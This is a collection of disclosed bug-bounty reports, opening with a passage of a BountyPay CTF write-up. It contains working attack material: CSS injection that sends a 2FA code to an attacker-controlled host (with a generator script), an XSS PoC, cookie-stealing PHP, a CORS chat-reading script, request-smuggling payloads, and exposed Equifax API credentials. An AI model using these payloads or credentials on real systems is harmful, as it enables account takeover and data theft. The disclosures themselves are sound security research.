app.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
api.bountypay.h1ctf.com
software.bountypay.h1ctf.com
```
Do you see that `software.bountypay.h1ctf.com`? That was new to me as well...I tried to open it but I was getting a `401 Unauthorized`.
What if I opened it by leveraging the path traversal I found before?
That worked, and I could see the HTML of that webpage in the response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 01 Jun 2020 20:28:45 GMT
Content-Type: application/json
Connection: close
Content-Length: 1605

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=01&year=2020","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
```
That page was a login area for something related to "Software Storage"...unfortunately, I couldn't figure out how to actually log in as it required a POST request that I was not able to send.
After spending way too much time on this, I decided to let it go and started looking at something else.

The right guess
=====================
I wanted to check if on `software.bountypay.h1ctf.com` there were more things other than its main page.
I was ready to start fuzzing with ffuf again for new paths, but before doing that I tried to visit `/uploads` manually and surprisingly enough that existed!
I encoded this json string:
```json
{"account_id":"../../redirect?url=https:\/\/software.bountypay.h1ctf.com/uploads#","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
and I sent it to the server with the usual method to bypass the 401 error.
This was the server response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 01 Jun 2020 20:44:54 GMT
Content-Type: application/json
Connection: close
Content-Length: 489

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads#\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```
By reading that HTML source, which was listing the files in the /uploads directory, I got to know that there was a BountyPay.apk on the server!
This time I was able to download it directly as it was not giving me a 401: `https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`

Say hi to Android!
=====================

This is where things got interesting.
The `BountyPay.apk` appeared to be a native Android application aka Java was involved.
I used [jadx-gui](https://github.com/skylot/jadx) to decompile it and after doing so I was able to read its source code.
After a quick look it appeared that [Android Intents](https://developer.android.com/reference/android/content/Intent) were being used.
The best way to trigger intents for this purpose was using [ADB](https://developer.android.com/studio/command-line/adb)...doing so, I was able to complete all the 3 parts of the Android challenge.
{F852373}
After a code review, I realized that I had to run the following ADB commands to trigger the right intents:
```shell
$ adb shell
$ am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" -n bounty.pay/.PartOneActivity
$ am start -a android.intent.action.VIEW -d "two://part?two=light&switch=on" -n bounty.pay/.PartTwoActivity
[ I wrote "X-Token" in the text field that just appeared ]
$ am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token" -n bounty.pay/.PartThreeActivity
[ A new text field appeared ]
$ adb shell cat ./data/data/bounty.pay/shared_prefs/user_created.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="USERNAME">sw33tLie</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">sw33tLie</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map>
[ I wrote the token in the new text field ]
[ Challenge completed! ]
```
Here's a picture showing all the important screenshots of the three activities:
{F852378}
As you can see, with the last ADB shell command I printed the shared preferences of the BountyPay app where I had a token (to run that command, a rooted device/emulator was needed, although there are other ways to do the same thing without that).
I pasted `8e9998ee3137ca9ade8f372739f062c1` into the text field that had appeared and I got that sweet screen saying I had completed the Android part of this CTF!

Note on the Android challenge
---------------------

As you can see, the three intents I called above made the app follow a specific code flow that would have not been triggered without them.
I'm sure there were other ways to solve this challenge, such as patching the SMALI code to call the right things, and then reinstalling the apk...but this is neither easy nor fast :)

So I did it...but what's next??
=====================
I had no idea, once again...but well, I had a token and tokens are supposed to be used somewhere.
Do you remember those subdomains that I found with zdns? 
One of them was a REST API, `https://api.bountypay.h1ctf.com/`.
I started fuzzing for endpoints using ffuf and I came across `/api/staff`.
I tried to send a POST request to it, using the token as value of the `X-Token` header:
```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Cache-Control: max-age=0
```
Got this as response:
```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 30 May 2020 20:50:30 GMT
Content-Type: application/json
Connection: close
Content-Length: 104

[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```
Cool, we had a few staff ids...now what?

The Hint
=====================

Luckily a hint from [Twitter](https://twitter.com/SandraA76708114/status/1258693001964068864) came handy: 
{F852391}
I believe there were other methods to get that ID but I guess CTFs can be solved in different ways...this was the OSINT way, if you like it :)
Then I tried to send this request, after a few failed attempts:
```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```
...and got this JSON response:
```http
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Jun 2020 12:08:04 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```
So I had the login details of a staff member!
I quickly tried to log in at `https://staff.bountypay.h1ctf.com`...it worked and I was redirected to `https://staff.bountypay.h1ctf.com/?template=home`:
{F852397}
What to do now? 
I noticed this dashboard had a bunch of features.
There was a page where I could see a demo support ticket sent by an admin, but I was not able to reply:
{F852400}
...and a page where I was able to set my profile name and choose my current avatar:
{F852401}
 No file upload, though!
On the bottom of every page there was a "Report this Page" link that if clicked made my browser send an HTTP request like this one:
```http
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOTMvd3J2VlVKUDV6N3ErVU9SK3Rlc3FMYXYvSFVSRlVnNXZ6MGFkMVpiYTE3UT09
```
Note that the `url` parameter is a base64 encoded string that when decoded becomes `/?template=home`
This was the only javascript code running on the website:
```javascript
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```
My account was not an admin but, from this code, I saw that there was a feature used by admins to upgrade other accounts.
I needed to become an admin!
The first thing that I did was changing my profile picture. An usual request looked like this:
```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: https://staff.bountypay.h1ctf.com
Connection: close
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOTMvd3J2VlVKUDV6N3ErVU9SK3Rlc3FMYXYvSFVSRlVnNXZ6MGFkMVpiYTE3UT09
Upgrade-Insecure-Requests: 1

profile_name=sandra&profile_avatar=avatar2
```
I figured out that I needed to change the profile_avatar parameter to `tab3+upgradeToAdmin`.
This was required because in the Support Tickets page my avatar was shown using the `profile_avatar` value as a CSS class.
Remember the `Report This Page` request? 
I encoded to base64 this string: `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab3` and then sent this HTTP request:
```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjM= HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOTMvd3J2VlVKUDV6N3ErVU9SK3Rlc3FMYXYvSFVSRlVnNXZ6MGFkMVpiYTE3UT09
```
At this point, I made an admin upgrade my account!
A new tab showed up in my dashboard:
{F852405}
So now I knew that the user `marten.mickos` existed and its password was `h&H5wy2Lggj*kKn4OD&Ype`!
These credentials worked on `https://app.bountypay.h1ctf.com`: I had to use the MD5 trick again to bypass the 2FA as explained before.

A new 2FA
=====================
I had already seen this dashboard, but this time it was not all empty.
After selecting May 2020 as date, I saw this:
{F852406}
So I clicked pay and a new 2FA challenge appeared:
{F852407}
This one was different and looked harder to bypass.
After clicking `Send Challenge` a request like this was sent:
```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```
Seeing that css file, I thought I might have been able to [exfiltrate the code via CSS injection](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense), so I tried that.
After many attempts, it turned out that the code I needed was in an input field.
To figure out its name, i used many CSS rules like this (hosted on a server that I own):
```css
input[name^=a] ~ *{
    background-image: url(https://mycollaboratordomain.net/char_1/a);
}
```
The whole file was made by repeating that for all characters (a-zA-Z).
With this method I was able to figure out what the first character of the input name was (c), as I got a callback on mycollaboratordomain.net with the correct character as path...I just had to repeat it for the second character and so on... 
```css
input[name^=ca] ~ *{
    background-image: url(https://mycollaboratordomain.net/char_2/a);
}
```
It turned out that there were many input fields, one for each character of the code...and their names were ranging from `code_1` to `code_6`.
At this point I made a new css file by repeating this CSS rule for all the input codes and all the characters (a-zA-Z):
```css
input[name=code_1][value^=$a] ~ *{
    background-image: url("https://mycollaboratordomain.net/code_1/$a");
}
```
I made a quick, ugly,  python3 script to generate it:
```python
import string
def get_css_rule(id, char):
    return "input[name=" + str(id) + "][value=" + str(char) + "] ~ *{\n    background-image: url(https://mycollaboratordomain.net/" + str(id) + "/" + str(char) + ");\n}\n"

with open("uni_2fa_style.css", "a") as css_file:
    codes = ['code_1', 'code_2', 'code_3', 'code_4', 'code_5', 'code_6']
    chars = list(string.ascii_uppercase) + list(string.ascii_lowercase)
    for code in codes:
        for char in chars
            css_file.write(get_css_rule(code, char))
```
After sending the 2FA code request and writing the CSS URL of my own custom file instead of the original  `app_style=https://www.bountypay.h1ctf.com/css/uni_2fa_style.css`, I got all the callbacks that I needed to figure out the 2FA code...or at least I thought so...the code was not valid!

Brute-forcing to the rescue
=====================

After a further look, It appeared that the 2FA code was 7 characters long (I assumed that from the `maxlength="7"` html attrubute of the page where I was supposed to input it).
So we were missing the last character...maybe?
No problem, I only had to bruteforce it with Burp Suite's Intruder!
Here's the flag, `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`!
{F852419}

This was a really nice CTF and I had a lot of fun (and headaches) playing it...thank you, [@adamtlangley](https://twitter.com/adamtlangley) and [@B3nac](https://twitter.com/B3nac)!

## Impact

_

---

### [unpermitted user can change the device name of admin account](https://hackerone.com/reports/865115)

- **Report ID:** `865115`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Helium
- **Reporter:** @error___404
- **Bounty:** - usd
- **Disclosed:** 2020-06-16T14:41:17.183Z
- **CVE(s):** -

**Vulnerability Information:**

Invited user with only the read-only permission can change the device name in admin account

1.create two account 'A 'and 'B ' in  console.helium
2.Invited the account 'B' with 'A' by giving the read-only permission
3.In account 'B' trying to delete the organization created by admin account 'A' and intercept the request then you got the organization id in request
4.Then in account 'B' add the device name and click on it and update the name which you want to display in the admin account(victim account)
5.And intercept the request while clicking the update button
6.In the request add the organization id which you got in step 3
7.then forward the request then the device name in admin account will be changed

## Impact

attacker with only the read-only permission can change the device name in the admin account

---

### [DOM XSS on duckduckgo.com search](https://hackerone.com/reports/868934)

- **Report ID:** `868934`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** DuckDuckGo
- **Reporter:** @cujanovic
- **Bounty:** - usd
- **Disclosed:** 2020-06-14T11:37:58.627Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, 
The is a DOM XSS vulnerability on https://duckduckgo.com search through the ```norw``` parameter.

PoC URL:  ```https://duckduckgo.com/?q=a&norw="><img src=/ onerror=alert(document.domain)>```

Screenshot: {F820482}

## Impact

The attacker can execute JS code.

---

### [Subdomain Takeover to Authentication bypass ](https://hackerone.com/reports/335330)

- **Report ID:** `335330`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Roblox
- **Reporter:** @geekboy
- **Bounty:** - usd
- **Disclosed:** 2020-04-23T20:50:11.710Z
- **CVE(s):** -

**Vulnerability Information:**

## Vulnerability Type: 
-----------
Subdomain Takeover

## Description: 
-----------
Due to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from `devrel.roblox.com` and perform different kind of attacks which i shared in impact section.

## Affected Area: 
-----------
http://devrel.roblox.com

## Steps to Reproduce:
-----------
+ Visit: https://devrel.roblox.com/subdomain-takeover

{F283580}

## Mitigation:
-----------
+ Remove the CNAME entry for the `devrel.roblox.com`

## Impact

Let's talk about about in details, as attacker could possible takeover other users account. 

1. As `.ROBLOSECURITY` cookies is scoped to `*.roblox.com` means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.

{F283554}

###steal_cookie.php

```php
<html>
<body>
<?php
echo "Cookies received: <br>";

foreach ($_COOKIE as $key=>$val)
  {
    echo "Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n";
  }
?>
</body>
</html>
``` 

2. Also `devrel.roblox.com` can be used to read all the chats between other users as 
 `devrel.roblox.com` is also white listed to make CORS request at  `chat.roblox.com` 

{F283553}

Which can be done like this: 

````html

<h2>CORS To Read Chat</h2>
<div id="demo">
<button type="button" onclick="cors()">Chat Reader @ Roblox</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = document.write(this.responseText);
    }
  };
  xhttp.open("GET", "https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 ````

Apart form all above issue, attacker can do following things as well.
+ Creating fake login page for credentials harvesting.
+ Sharing malicious files using roblox.
+ Creating mail account using GSuite to send and recived emails on behalf of `*@devrel.roblox.com`

---

### [HTTP Request Smuggling on my.stripo.email](https://hackerone.com/reports/777651)

- **Report ID:** `777651`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Stripo Inc
- **Reporter:** @codeslayer1337
- **Bounty:** - usd
- **Disclosed:** 2020-04-10T07:54:00.219Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

## Steps To Reproduce:
I use BurpSuite with the help of the HTTP Smuggler Request plugin to provide POC
1.Run the burp suite turbo intruder on the following request
POST /?aeRg=2056729135 HTTP/1.1
Host: my.stripo.email
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding : chunked
Content-Len%s keep-alive

f
ubvhq=x&e3t5b=x
0


2.The script for the turbo intruder is attached with the name poc.txt
3.301 object responses OK for the post request needed to provide a header response to Location: https://codeslayer137.000webhostapp.com/indeks. php Please see the attached screenshot. (2.png).

## Impact

Impact
an attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

Best regards

CodeSlayer13

**Summary (team):**

HTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.
By supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.

---

### [Information Leak (Github)](https://hackerone.com/reports/694931)

- **Report ID:** `694931`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Equifax-vdp
- **Reporter:** @zifrox
- **Bounty:** - usd
- **Disclosed:** 2020-04-09T20:47:52.176Z
- **CVE(s):** -

**Vulnerability Information:**

In Github I found some credentials to use in a webservice that exposes very sensitive information of people, family group, financial situation, and more.

Github:
https://github.com/geraldincg/proyecto/blob/9c89787deb1d217f58b58786d90bfb3eab290237/Proyecto/ViewModels/WebService/ConexionWS.cs

The  webservice is subdomain for Costa Rica:
Change "referencia" identification number to obtain different results.
Example:

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891550&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891547&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891543&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

## Impact

An attacker can extract information any people in the system.

---

### [[Part II] Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation](https://hackerone.com/reports/796808)

- **Report ID:** `796808`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Shopify
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2020-04-01T21:02:00.348Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary 
In #791775, I submitted a bug at Sunday 5pm Canada time, it was triaged two hours later, and I got the **temp** fix message at around 3am the next day in Canada time. Truly awesome, the next day I retested after the first fix, and found that I

- Cannot receive the email confirmation in the email used to sign up
- Cannot integrate across stores/partner even they share the same email address after confirming them

And the report was later resolved after I verified the fix.

For some reason, I decided to test again to see what's something new that I can find.

Then I found user can change their email prior to receiving the verification message on their original email. i.e. the same technique, I don't know what went wrong in my first retest, but Shopify security and engineering team again showed their professionalism, quickly resolving the second comments I left in ~3.5 hrs.

And when I thought this is the end of story, I later received a comment asking me to open a new report about the second retest, and here I am writing this report.

Thanks,
Ron

## Impact

.

**Summary (team):**

On February 14th, while verifying the fix for https://hackerone.com/reports/791775, @ngalog identified another bug allowing someone to verify an email address they did not own. The bug could have given access to a small subset of Shopify user accounts the user did not own. 

Our team immediately disabled the impacted functionality and deployed a permanent fix two hours later.

---

### [Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any Shop Owner by Taking Advantage of the Shopify SSO](https://hackerone.com/reports/791775)

- **Report ID:** `791775`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Shopify
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2020-04-01T21:01:33.551Z
- **CVE(s):** -

**Vulnerability Information:**

I told Pete I would take a look at Spotify, hi Pete.

## Summary
It's possible to take over any store account through bypassing the email confirmation step in *.myshopify.com. I found a way to confirm arbitrary emails, and after confirming arbitrary email in *.myshopify.com, user is able to **integrate** with other Shopify store that shares the same email address by setting a master password for all of the stores(if the owner hasn't integrated before), effectively taking over every Shopify stores by knowing just the owner's email address.

After signing up a new Shopify instance in https://www.shopify.com/pricing and start the free trial, user can change their email address to a new email address before confirming the one they used to sign up.

The bug is that Shopify email system mistakenly send the confirmation link of the new email address, to the one that is used to signed up.

And the result is user can confirm arbitrary email address. And the next step is taking over other user's Shopify instance by taking advantage of the SSO.

## Quick check
If you check https://h31ngalog.myshopify.com/ and see the email address of the owner, it is ngalog@hackerone.com, which I obviously would never be able to validate otherwise
{F711349}

## steps to reproduce
- Visit https://www.shopify.com/pricing and signup a free trial with an email address, say attacker@gmail.com that you can receive emails
- after entering the fields to enter the store, on top right corner, click your name and go to **Your Profile**
- change your email to someone that you want to takeover, for example yaworsk@hackerone.com and click save
- All done now, grab a coffee, sit back and relax, watch some YouTube videos and wait for an email to go to your email attacker@gmail.com
- The email that you are waiting for is from mailer@shopify.com, and the format should look like this {F711348}
- Click the link and you should see your email has been updated to yaworsk@hackerone.com

## Reason?
Email system mistakenly send the confirmation link of yaworsk@hackerone.com to attacker@gmail.com because attacker@gmail.com is the one that is saved on system, and the email system didn't notice the confirmation link has been updated to yaworsk@gmail.com, and should not be sent to attacker@gmail.com

## SSO account takeover
- now we have the ability to confirm arbitrary email, then we can takeover other stores
- On top right corner of you-shop.myshopify.com click your name then click profile, you should see a box that says, you have other two accounts in Shopify, want to integrate them together
- click yes, then just follow the instructions then you will be able to takeover all other stores by changing the master password for all of the stores under that email address.

## Impact

Ability to confirm arbitrary email on *.myshopify.com and leverage SSO to set master password for all other stores under the same password

**Summary (team):**

On February 9th, @ngalog reported that it was possible to bypass Shopify's email verification for a small subset of Shopify user accounts. Doing so would have allowed a user to access accounts they did not own. Our team immediately disabled the impacted functionality and deployed a permanent fix three hours later. 

After resolving the report, @ngalog demonstrated being able to bypass the email verification again. We investigated and discovered another bug with a separate root cause. We asked him to submit a [separate report](https://hackerone.com/reports/796808) to be awarded separately.

---

### [xss](https://hackerone.com/reports/281387)

- **Report ID:** `281387`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Stellar.org
- **Reporter:** @vyshnav_nk
- **Bounty:** - usd
- **Disclosed:** 2020-02-23T16:22:08.654Z
- **CVE(s):** -

**Vulnerability Information:**

content on a server is including Javascript content from an unrelated domain. When this script code is fetched by a user browser and loaded into the DOM,

 it will have complete control over the DOM, bypassing the protection offered by the same-origin policy. 

Even if the source of the script code is trusted by the website operator, malicious code could be introduced if the server is ever compromised.
 
It is strongly recommended that sensitive applications host all included Javascript locally.

This gives the operator of the server where the code originates control over the DOM, and the web application .

---

### [[h1-415 2020] Multiple chained vulnerabilities lead to leaking secret document](https://hackerone.com/reports/777241)

- **Report ID:** `777241`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @nytr0gen
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T20:45:05.901Z
- **CVE(s):** -

**Vulnerability Information:**

Hi!

# Summary
Multiple chained vulnerabilities lead to leaking secret documents.

Improper sanitization in registration allows an attacker to create a QR recover code for any email address. This leads to an account takeover.

Using that technique on jobert's account, attacker can access the support chat functionality. This endpoint, besides some meaningful conversation, is vulnerable to Blind XSS.

Blind XSS leaks an admin page that can change the name of any user, knowing the `user_id`. Abusing this vulnerability an attacker can change his name to a malicious payload and run it through the PDF converter. An attacker can then leak the secret documents processed by the converter.

The secret document contains the following highly classified flag: `h1ctf{y3s_1m_c0sm1c_n0w}`

# Story

My journey consists of two almost sleepless nights, skipping two days of gym, drinking hot chocolate late at night and praying for cosmic bugs.

## 0. Recon

I begin by proceeding to recon the application from all angles and noting everything in a document. I learned that from [ippsec's videos](https://ippsec.rocks/), small shout out.

Some interesting bits I observed are:

After you register, you get a beautiful QR Code, specially made for you, that you might want to save. It contains the email address (hex encoded) and a big token, which may be a hash of something (email, id, username, name, [random stuff](https://dilbert.com/strip/2001-10-25)), may not be a hash of something.

There is a PDF convertor. Also it converts the image to a thumbnail. I'll go an limb here and say that the PDF is what we should focus on, based on: gut feeling, the fact that nahamsec has a pinned post about PDF generators, and the fact that he did say that, on discord.

{F688269}

You can find jobert's email on the first page if you're reading the source code. It is `jobert@mydocz.cosmic`. Does that mean we will find some cosmic bugs today? I hope so.

{F688270}

While logging out I noticed an `return_url` parameter for login. That's pretty cool, in my experience, it allows for open redirect. This one kinda does, but not really. It's a POST based open redirect and you need the CSRF Token. I tried XSS, SSTI and everything else in between but no luck.

